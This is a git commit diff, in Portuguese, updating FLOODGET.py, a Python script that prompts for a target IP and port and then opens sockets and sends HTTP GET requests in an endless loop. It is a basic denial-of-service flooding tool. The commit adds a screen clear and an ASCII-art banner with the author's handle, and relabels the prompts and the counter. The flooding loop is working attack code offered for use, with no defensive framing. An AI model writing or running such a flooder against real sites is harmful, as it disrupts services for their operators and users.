892f79e72e931b010db0b125e56bf29144a75ea3
FelipeCR <138263642+MirrorWF@users.noreply.github.com>
2023-07-22 21:11:18 -0300

    Atualizar o FLOODGET.py

--- FLOODGET.py
+++ FLOODGET.py
@@ -1,11 +1,26 @@
 # Bibliotecas
 import socket
 from colorama import Fore, Back, Style
+import os
+
+# Clear
+os.system ("clear")
+
+#ASCII
+print (Fore.RED + """⠤⣤⣤⣤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀
+⢠⣤⣤⡄⣤⣤⣤⠄⣀⠉⣉⣙⠒⠤⣀⠀⠀
+⣄⢻⣿⣧⠻⠇⠋⠀⠋⠀⢘⣿⢳⣦⣌⠳⠄
+⠈⠃⠙⢿⣧⣙⠶⣿⣿⡷⢘⣡⣿⣿⣿⣷⣄
+⠀⠀⠀⠀⠉⠻⣿⣶⠂⠘⠛⠛⠛⢛⡛⠋⠉
+⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⠃⠀⠀
+⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣾⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣿⠅⠀⠀⠀⠀⠀⣿⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⢸⠀@felipecamilocp⠀""")
 
 # Armazenaveis
 
 numero_sockets = 0
-alvo = input (Fore.GREEN + "Digite o URL do site: ")
+alvo = input (Fore.GREEN + "\nDigite o IP do site: ")
 porta = int(input(Fore.YELLOW + "Digite a porta desejada: "))
 data = f"GET / HTTP/1.1\r\nHost: {alvo}\r\n\r\n"
 
@@ -15,4 +30,4 @@ while True:
 	client_socket.connect((alvo, porta))
 	client_socket.sendall(data.encode())
 	numero_sockets += 1
-	print (Fore.MAGENTA + f"{numero_sockets} Solicitação TCP (Conexão Aberta)")
+	print (Fore.MAGENTA + f"{numero_sockets} Solicitação HTTP (Conexão Aberta)")
